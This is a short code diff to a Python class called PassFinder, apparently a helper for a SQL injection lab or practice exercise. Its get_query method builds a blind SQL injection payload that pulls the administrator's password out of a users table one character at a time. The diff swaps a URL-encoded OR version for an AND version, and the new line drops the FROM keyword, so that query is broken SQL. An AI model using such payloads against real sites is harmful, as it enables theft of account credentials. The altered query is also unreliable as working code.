@@ -23,7 +23,7 @@ class PassFinder:
 
 
     def get_query(self, number, char):
-        asd = f"'%20OR%20(SELECT%20SUBSTRING(password%2c{number}%2c1)%20FROM%20users%20WHERE%20username%3d'administrator')%3d'{char}'--"
+        asd = f"' AND (SELECT SUBSTRING(password,{number},1) users WHERE username='administrator')='{char}'--"
         return asd
 
 
